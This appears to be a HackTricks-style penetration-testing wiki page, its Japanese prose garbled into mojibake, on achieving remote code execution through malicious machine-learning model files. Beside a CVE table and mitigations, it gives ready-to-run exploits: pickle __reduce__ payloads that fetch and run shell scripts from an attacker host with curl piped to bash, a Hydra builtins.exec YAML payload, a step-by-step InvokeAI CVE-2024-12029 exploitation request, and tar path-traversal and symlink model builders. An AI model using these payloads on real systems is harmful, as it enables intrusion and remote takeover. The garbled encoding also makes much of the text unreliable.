# ãƒ¢ãƒ‡ãƒ«ã®RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models ã¯é€šå¸¸ ONNXã€TensorFlowã€PyTorch ãªã©ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã§å…±æœ‰ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ¢ãƒ‡ãƒ«ã¯é–‹ç™ºè€…ã®ãƒã‚·ãƒ³ã‚„æœ¬ç•ªã‚·ã‚¹ãƒ†ãƒ ã«ãƒ­ãƒ¼ãƒ‰ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚é€šå¸¸ã€ãƒ¢ãƒ‡ãƒ«ã«æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã‚‹ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€ãƒ¢ãƒ‡ãƒ«ãŒ system ä¸Šã§ arbitrary code ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ã‚ã‚Œå¾—ã‚‹ã‚±ãƒ¼ã‚¹ãŒã‚ã‚Šã€ãã‚Œã¯æ„å›³ã•ã‚ŒãŸæ©Ÿèƒ½ã«ã‚ˆã‚‹ã‚‚ã®ã‹ã€ãƒ¢ãƒ‡ãƒ«èª­ã¿è¾¼ã¿ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®è„†å¼±æ€§ã«ã‚ˆã‚‹ã‚‚ã®ã§ã™ã€‚

åŸ·ç­†æ™‚ç‚¹ã§ã€ã“ã®ç¨®ã®è„†å¼±æ€§ã®ä¾‹ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š

| **ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ / ãƒ„ãƒ¼ãƒ«**        | **è„†å¼±æ€§ï¼ˆCVE ãŒã‚ã‚‹å ´åˆï¼‰**                                                    | **RCE ãƒ™ã‚¯ã‚¿ãƒ¼**                                                                                                                           | **å‚ç…§**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | ãƒ¢ãƒ‡ãƒ«ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆå†…ã®æ‚ªæ„ã‚ã‚‹ pickle ãŒ code execution ã‚’å¼•ãèµ·ã“ã™ï¼ˆ`weights_only` ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ï¼‰                                        | |
| PyTorch **TorchServe**      | *ShellTorch* â€“ **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF ã¨æ‚ªæ„ã‚ã‚‹ãƒ¢ãƒ‡ãƒ«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ code execution ãŒç™ºç”Ÿ; management API ã«ãŠã‘ã‚‹ Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | ä¿¡é ¼ã§ããªã„ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆãŒ `load_model_trainer_states_from_checkpoint` ä¸­ã« pickle reducer ã‚’èµ·å‹• â†’ ML worker ã§ code execution            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML ã‹ã‚‰ãƒ¢ãƒ‡ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹éš›ã« `yaml.unsafe_load` ã‚’ä½¿ç”¨ï¼ˆcode execï¼‰ <br> **Lambda** ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’å«ã‚€ãƒ¢ãƒ‡ãƒ«ã®ãƒ­ãƒ¼ãƒ‰ã¯ arbitrary Python code ã‚’å®Ÿè¡Œ          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | ç´°å·¥ã•ã‚ŒãŸ `.tflite` ãƒ¢ãƒ‡ãƒ«ãŒ integer overflow ã‚’å¼•ãèµ·ã“ã— â†’ heap corruptionï¼ˆpotential RCEï¼‰                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` ã§ãƒ¢ãƒ‡ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã¨ attacker ã® `__reduce__` ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ pickle ãŒå®Ÿè¡Œã•ã‚Œã‚‹                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯ pickled object arrays ã‚’è¨±å¯ã—ã¦ãŠã‚Šã€æ‚ªæ„ã‚ã‚‹ `.npy/.npz` ãŒ code exec ã‚’å¼•ãèµ·ã“ã™                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX ãƒ¢ãƒ‡ãƒ«ã® external-weights ãƒ‘ã‚¹ãŒãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‹ã‚‰è„±å‡ºã§ãã‚‹ï¼ˆread arbitrary filesï¼‰ <br> æ‚ªæ„ã‚ã‚‹ ONNX ãƒ¢ãƒ‡ãƒ« tar ãŒä»»æ„ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¸Šæ›¸ãã§ãã‚‹ï¼ˆleading to RCEï¼‰ | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operator ã‚’å«ã‚€ãƒ¢ãƒ‡ãƒ«ã¯æ”»æ’ƒè€…ã® native code ã®ãƒ­ãƒ¼ãƒ‰ã‚’å¿…è¦ã¨ã™ã‚‹; è¤‡é›‘ãªãƒ¢ãƒ‡ãƒ«ã‚°ãƒ©ãƒ•ãŒãƒ­ã‚¸ãƒƒã‚¯ã‚’æ‚ªç”¨ã—ã¦æ„å›³ã—ãªã„è¨ˆç®—ã‚’å®Ÿè¡Œã™ã‚‹   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` ã‚’æœ‰åŠ¹ã«ã—ã¦ model-load API ã‚’ä½¿ç”¨ã™ã‚‹ã¨ relative path traversal ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚ã‚‹ï¼ˆä¾‹: `.bashrc` ã‚’ overwrite ã—ã¦ RCEï¼‰    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 â€¦ 25668** (multiple heap overflows)                                                                         | ç ´æã—ãŸ GGUF ãƒ¢ãƒ‡ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ãŒãƒ‘ãƒ¼ã‚µã§ heap buffer overflows ã‚’èµ·ã“ã—ã€victim system ä¸Šã§ arbitrary code execution ã‚’å¯èƒ½ã«ã™ã‚‹                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’å«ã‚€æ‚ªæ„ã‚ã‚‹ HDF5 (`.h5`) ãƒ¢ãƒ‡ãƒ«ã®ã‚³ãƒ¼ãƒ‰ã¯ãƒ­ãƒ¼ãƒ‰æ™‚ã«å®Ÿè¡Œã•ã‚Œã‚‹ï¼ˆKeras safe_mode ã¯å¤ã„ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã‚’ã‚«ãƒãƒ¼ã—ãªã„ â€“ â€œdowngrade attackâ€ï¼‰ | |
| **Others** (general)        | *Design flaw* â€“ Pickle serialization                                                                                         | å¤šãã®MLãƒ„ãƒ¼ãƒ«ï¼ˆä¾‹: pickle ãƒ™ãƒ¼ã‚¹ã®ãƒ¢ãƒ‡ãƒ«ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã€Python ã® `pickle.load`ï¼‰ã¯ã€å¯¾ç­–ãŒãªã‘ã‚Œã°ãƒ¢ãƒ‡ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã«åŸ‹ã‚è¾¼ã¾ã‚ŒãŸ arbitrary code ã‚’å®Ÿè¡Œã™ã‚‹ | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ãƒ¢ãƒ‡ãƒ«ã® metadata/config ãŒ `_target_` ã‚’ arbitrary callableï¼ˆä¾‹: `builtins.exec`ï¼‰ã«è¨­å®š â†’ load ä¸­ã«å®Ÿè¡Œã•ã‚Œã‚‹ã€‚ã“ã‚Œã¯ â€œsafeâ€ ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆï¼ˆ`.safetensors`, `.nemo`, repo `config.json`ï¼‰ã§ã‚‚èµ·ã“ã‚Šå¾—ã‚‹ | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

ã•ã‚‰ã«ã€[PyTorch](https://github.com/pytorch/pytorch/security) ãªã©ã§ä½¿ã‚ã‚Œã‚‹ python ã® pickle ãƒ™ãƒ¼ã‚¹ã®ãƒ¢ãƒ‡ãƒ«ã¯ã€`weights_only=True` ã§ãƒ­ãƒ¼ãƒ‰ã•ã‚Œãªã„å ´åˆã€system ä¸Šã§ arbitrary code ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«åˆ©ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€ä¸Šã®è¡¨ã«è¨˜è¼‰ãŒãªãã¦ã‚‚ã€pickle ãƒ™ãƒ¼ã‚¹ã®ãƒ¢ãƒ‡ãƒ«ã¯ã“ã®ç¨®ã®æ”»æ’ƒã«ç‰¹ã«è„†å¼±ã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### Hydra metadata â†’ RCE (works even with safetensors)

`hydra.utils.instantiate()` ã¯ configuration/metadata ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå†…ã® dotted `_target_` ã‚’ import ã—ã¦å‘¼ã³å‡ºã—ã¾ã™ã€‚ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒ **untrusted model metadata** ã‚’ `instantiate()` ã«æ¸¡ã™ã¨ã€æ”»æ’ƒè€…ã¯ callable ã¨å¼•æ•°ã‚’æä¾›ã—ã¦ã€model load æ™‚ã«å³åº§ã«å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆpickle ã¯ä¸è¦ï¼‰ã€‚

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- NeMo ã® `restore_from/from_pretrained`ã€uni2TS HuggingFace codersã€FlexTok loaders ã§ãƒ¢ãƒ‡ãƒ«åˆæœŸåŒ–ã®å‰ã«ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹ã€‚
- Hydra ã®æ–‡å­—åˆ—ãƒ–ãƒ­ãƒƒã‚¯ãƒªã‚¹ãƒˆã¯ã€ä»£æ›¿ã® import ãƒ‘ã‚¹ï¼ˆä¾‹: `enum.bltns.eval`ï¼‰ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³è§£æ±ºåï¼ˆä¾‹: `nemo.core.classes.common.os.system` â†’ `posix`ï¼‰ã‚’ä½¿ã£ã¦å›é¿å¯èƒ½ã€‚
- FlexTok ã¯ã¾ãŸã€æ–‡å­—åˆ—åŒ–ã•ã‚ŒãŸãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’ `ast.literal_eval` ã§è§£æã™ã‚‹ãŸã‚ã€Hydra å‘¼ã³å‡ºã—å‰ã« DoSï¼ˆCPU/ãƒ¡ãƒ¢ãƒªã®æ¯æ¸‡ï¼‰ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒå¯èƒ½ã€‚

### ğŸ†•  InvokeAI ã® RCEï¼ˆ`torch.load` çµŒç”±ï¼‰ (CVE-2024-12029)

`InvokeAI` ã¯ Stable-Diffusion å‘ã‘ã®äººæ°—ã®ã‚ã‚‹ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã® Web ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã§ã™ã€‚ãƒãƒ¼ã‚¸ãƒ§ãƒ³ **5.3.1 â€“ 5.4.2** ã¯ã€ä»»æ„ã® URL ã‹ã‚‰ãƒ¢ãƒ‡ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹ REST ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ `/api/v2/models/install` ã‚’å…¬é–‹ã—ã¦ã„ã¾ã™ã€‚

å†…éƒ¨çš„ã«ã¯ã€ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯æœ€çµ‚çš„ã«æ¬¡ã‚’å‘¼ã³å‡ºã—ã¾ã™:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### æ‚ªç”¨æ‰‹é †

1. æ‚ªæ„ã®ã‚ã‚‹ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. ã‚ãªãŸãŒç®¡ç†ã™ã‚‹ HTTP ã‚µãƒ¼ãƒãƒ¼ã§ `payload.ckpt` ã‚’ãƒ›ã‚¹ãƒˆã—ã¾ã™ï¼ˆä¾‹: `http://ATTACKER/payload.ckpt`ï¼‰ã€‚
3. è„†å¼±ãªã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ï¼ˆèªè¨¼ä¸è¦ï¼‰:
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false â†’ no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. When InvokeAI downloads the file it calls `torch.load()` â†’ the `os.system` gadget runs and the attacker gains code execution in the context of the InvokeAI process.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### æ¡ä»¶

â€¢  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
â€¢  `/api/v2/models/install` ãŒæ”»æ’ƒè€…ã‹ã‚‰åˆ°é”å¯èƒ½ã§ã‚ã‚‹ã“ã¨  
â€¢  ãƒ—ãƒ­ã‚»ã‚¹ãŒ shell commands ã‚’å®Ÿè¡Œã™ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã“ã¨

#### ç·©å’Œç­–

* Upgrade to **InvokeAI â‰¥ 5.4.3** â€“ the patch sets `scan=True` by default and performs malware scanning before deserialization.  
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> âš ï¸ Remember that **any** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) is inherently unsafe to deserialize from untrusted sources.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### ğŸ†• NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA ã® Transformers4Recï¼ˆMerlin ã®ä¸€éƒ¨ï¼‰ã¯ã€å®‰å…¨ã§ãªã„ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆãƒ­ãƒ¼ãƒ€ãƒ¼ã‚’å…¬é–‹ã—ã¦ãŠã‚Šã€ãƒ¦ãƒ¼ã‚¶æä¾›ã®ãƒ‘ã‚¹ã«å¯¾ã—ã¦ç›´æ¥ `torch.load()` ã‚’å‘¼ã³å‡ºã—ã¦ã„ã¾ã—ãŸã€‚`torch.load` ãŒ Python ã® `pickle` ã«ä¾å­˜ã—ã¦ã„ã‚‹ãŸã‚ã€æ”»æ’ƒè€…ãŒç”¨æ„ã—ãŸãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆã¯ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸­ã® reducer ã‚’ä»‹ã—ã¦ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

è„†å¼±ãªãƒ‘ã‚¹ï¼ˆä¿®æ­£å‰ï¼‰: `transformers4rec/torch/trainer/trainer.py` â†’ `load_model_trainer_states_from_checkpoint(...)` â†’ `torch.load(...)`ã€‚

ãªãœã“ã‚ŒãŒ RCE ã«ã¤ãªãŒã‚‹ã®ã‹: Python ã® pickle ã§ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ reducer (`__reduce__`/`__setstate__`) ã‚’å®šç¾©ã—ã¦ã€å‘¼ã³å‡ºã—å¯èƒ½ãªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨å¼•æ•°ã‚’è¿”ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚¢ãƒ³ãƒ”ãƒƒã‚¯ãƒ«ï¼ˆunpicklingï¼‰ä¸­ã«ãã®å‘¼ã³å‡ºã—å¯èƒ½ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã‚‚ã—ãã®ã‚ˆã†ãªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆã«å«ã¾ã‚Œã¦ã„ã‚Œã°ã€é‡ã¿ãŒä½¿ç”¨ã•ã‚Œã‚‹å‰ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆ/ãƒ¢ãƒ‡ãƒ«ãŒãƒªãƒã‚¸ãƒˆãƒªã€ãƒã‚±ãƒƒãƒˆã€ã¾ãŸã¯ã‚¢ãƒ¼ãƒ†ã‚£ãƒ•ã‚¡ã‚¯ãƒˆãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚’ä»‹ã—ã¦å…±æœ‰ã•ã‚Œã‚‹
- ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è‡ªå‹•ãƒ­ãƒ¼ãƒ‰ã™ã‚‹è‡ªå‹•åŒ–ã•ã‚ŒãŸ resume/deploy ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³
- å®Ÿè¡Œã¯ training/inference ãƒ¯ãƒ¼ã‚«ãƒ¼å†…ã§ç™ºç”Ÿã—ã€å¤šãã®å ´åˆç‰¹æ¨©ã§ï¼ˆä¾‹ï¼šroot in containersï¼‰å®Ÿè¡Œã•ã‚Œã‚‹

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ã¯ç›´æ¥ã® `torch.load()` ã‚’ `transformers4rec/utils/serialization.py` ã«å®Ÿè£…ã•ã‚ŒãŸé™å®šã•ã‚ŒãŸè¨±å¯ãƒªã‚¹ãƒˆæ–¹å¼ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ã«ç½®ãæ›ãˆã¾ã—ãŸã€‚æ–°ã—ã„ãƒ­ãƒ¼ãƒ€ãƒ¼ã¯å‹/ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’æ¤œè¨¼ã—ã€ãƒ­ãƒ¼ãƒ‰æ™‚ã«ä»»æ„ã® callables ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã®ã‚’é˜²ãã¾ã™ã€‚

Defensive guidance specific to PyTorch checkpoints:
- ä¿¡é ¼ã§ããªã„ãƒ‡ãƒ¼ã‚¿ã‚’ unpickle ã—ãªã„ã“ã¨ã€‚å¯èƒ½ã§ã‚ã‚Œã° [Safetensors](https://huggingface.co/docs/safetensors/index) ã‚„ ONNX ã‚’å„ªå…ˆã™ã‚‹ã€‚
- ã©ã†ã—ã¦ã‚‚ PyTorch ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’ä½¿ã†å¿…è¦ãŒã‚ã‚‹å ´åˆã¯ã€`weights_only=True`ï¼ˆæ–°ã—ã„ PyTorch ã§ã‚µãƒãƒ¼ãƒˆï¼‰ã‚’æŒ‡å®šã™ã‚‹ã‹ã€Transformers4Rec ã®ãƒ‘ãƒƒãƒã«é¡ä¼¼ã—ãŸè¨±å¯ãƒªã‚¹ãƒˆæ–¹å¼ã®ã‚«ã‚¹ã‚¿ãƒ  unpickler ã‚’ä½¿ã†ã“ã¨ã€‚
- ãƒ¢ãƒ‡ãƒ«ã®å‡ºè‡ª/ç½²åã‚’å¼·åˆ¶ã—ã€ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å†…ã§ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’è¡Œã†ï¼ˆseccomp/AppArmor; non-root user; åˆ¶é™ã•ã‚ŒãŸ FS ã¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ egress ã®ç¦æ­¢ï¼‰ã€‚
- ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆã®ãƒ­ãƒ¼ãƒ‰æ™‚ã« ML ã‚µãƒ¼ãƒ“ã‚¹ã‹ã‚‰ã®äºˆæœŸã—ãªã„å­ãƒ—ãƒ­ã‚»ã‚¹ã‚’ç›£è¦–ã—ã€`torch.load()`/`pickle` ã®ä½¿ç”¨ã‚’ãƒˆãƒ¬ãƒ¼ã‚¹ã™ã‚‹ã“ã¨ã€‚

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example â€“ crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- ãƒ¢ãƒ‡ãƒ«ã‚’èª­ã¿è¾¼ã‚€:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# âš ï¸ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent ã® FaceDetection-DSFD ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¶å¾¡ã®ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ `resnet` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å…¬é–‹ã—ã¦ã„ã‚‹ã€‚ZDI ã«ã‚ˆã£ã¦ã€ãƒªãƒ¢ãƒ¼ãƒˆæ”»æ’ƒè€…ãŒè¢«å®³è€…ã«æ‚ªæ„ã‚ã‚‹ãƒšãƒ¼ã‚¸/ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã¾ã›ã€ãã®ãƒšãƒ¼ã‚¸/ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚ˆã‚Šç´°å·¥ã—ãŸ serialized blob ã‚’å½“è©²ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«é€ä¿¡ã•ã›ã€`root` ã¨ã—ã¦ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’å¼•ãèµ·ã“ã—å®Œå…¨ãªä¾µå®³ã«ã¤ãªãŒã‚‹ã“ã¨ãŒç¢ºèªã•ã‚ŒãŸã€‚

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## ãƒ¢ãƒ‡ãƒ«ã‚’åˆ©ç”¨ã—ãŸ Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
ã‚ã‚‹ã„ã¯ã€ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ã†ã¨ã€èª­ã¿è¾¼ã¾ã‚ŒãŸã¨ãã« `/tmp` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¸ã®ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’ä½œæˆã™ã‚‹ãƒ¢ãƒ‡ãƒ«ã‚’ä½œæˆã§ãã¾ã™ï¼š
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### è©³ç´°è§£æ: Keras .keras deserialization and gadget hunting

.keras internalsã€Lambda-layer RCEã€â‰¤ 3.8 ã® arbitrary import issueã€ãŠã‚ˆã³ allowlist å†…ã® post-fix gadget discovery ã«é–¢ã™ã‚‹é›†ä¸­çš„ãªã‚¬ã‚¤ãƒ‰ã¯ã€æ¬¡ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## å‚è€ƒæ–‡çŒ®

- [OffSec blog â€“ "CVE-2024-12029 â€“ InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch â€“ security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog â€“ CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
